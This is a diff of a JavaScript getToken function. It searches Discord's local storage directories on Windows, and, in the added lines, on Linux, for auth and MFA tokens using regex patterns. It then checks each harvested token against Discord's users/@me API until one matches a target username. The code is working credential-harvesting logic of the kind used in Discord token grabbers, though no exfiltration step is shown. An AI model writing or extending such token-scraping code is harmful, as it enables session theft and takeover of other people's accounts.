@@ -13,6 +13,7 @@ async function getToken(username, descriminator) {
     var token = /[A-Za-z\d]{24}\.[\w]{6}\.[\w]{27}/;
     var mfaToken = /mfa\.[\w-]{84}/;
     var WinLocation = `C:${sep}Users${sep}${os.userInfo().username}${sep}AppData${sep}Roaming`;
+    var linLocation = `${sep}home${sep}${os.userInfo().username}${sep}.config`;
 
     var x = [];
     var y = [];
@@ -48,6 +49,66 @@ async function getToken(username, descriminator) {
             `${WinLocation}${sep}discord`,
             `${WinLocation}${sep}discordptb`,
             `${WinLocation}${sep}discordcanary`,
+        ]
+
+        x = await getSortedFiles(paths);
+
+        setTimeout(async () => {
+            x.forEach(async f => {
+                fs.readFile(f, function (err, data) {
+                    if (err) throw err;
+                    data = data.toString();
+
+                    if (token.test(data)) {
+                        let z = token.exec(data);
+
+                        let t = z[0];
+                        if(token.test(t)) if (y.indexOf(t) === -1) y.push(t);
+                    } else if (mfaToken.test(data)) {
+                        let z = mfaToken.exec(data);
+
+                        let t = z[0];
+                        if (mfaToken.test(t)) if (y.indexOf(t) === -1) y.push(t);
+                    }
+                });
+            });
+
+            setTimeout(() => {
+                y.forEach(async t => {
+                    if (found === false) {
+                        await axios.get('https://discord.com/api/v7/users/@me', {
+                            headers: {
+                                "Content-Type": "application/json",
+                                "authorization": t,
+                            }
+                        }).then(async (res) => {
+                            const d = res.data;
+                            if (d.username == username) {
+                                if (descriminator !== null) {
+                                    if (d.descriminator == descriminator) {
+                                        found = true
+                                        userToken = t;
+                                        return;
+                                    } else return null;
+                                }
+                                found = true;
+                                userToken = t;
+                            }
+                        }).catch(e => {
+                            if(e.toString().includes('401')) return;
+                            else console.error(e);
+                        });
+                    }
+                });
+            }, 2000)
+
+            
+        }, 500);
+    } else if (os.type().toLowerCase().includes('linux')) {
+        let paths = [
+            `${linLocation}${sep}discord`,
+            `${linLocation}${sep}discordptb`,
+            `${linLocation}${sep}discordcanary`,
         ]
 
         x = await getSortedFiles(paths);
